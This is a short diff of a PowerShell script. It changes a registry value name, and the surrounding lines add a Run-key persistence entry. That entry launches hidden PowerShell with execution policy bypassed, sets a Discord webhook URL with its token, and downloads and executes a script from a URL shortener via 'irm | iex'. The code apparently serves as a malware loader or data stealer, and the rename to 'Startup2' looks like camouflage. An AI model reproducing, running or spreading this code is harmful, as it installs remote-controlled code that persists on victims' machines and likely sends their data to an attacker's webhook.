@@ -23,7 +23,7 @@ if ($currentDate -gt $expiryDate) {
 
 # Add this script to startup to ensure it runs every time the system boots
 $regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$scriptName = "MyStartupScript"  # You can change this name if you like
+$scriptName = "Startup2"  # You can change this name if you like
 
 # Command to execute in the startup registry
 $regCommand = 'powershell -NoP -Ep Bypass -W H -C $dc="https://discord.com/api/webhooks/1309885018176225410/EEmhqMHXRSZSJfWfphI5wn19t9PDTYbxxCTdlL9Aeohn1Ahc7RgCaKnT9PQ6SOWQx3wx"; irm https://shorturl.at/R2sYz | iex'
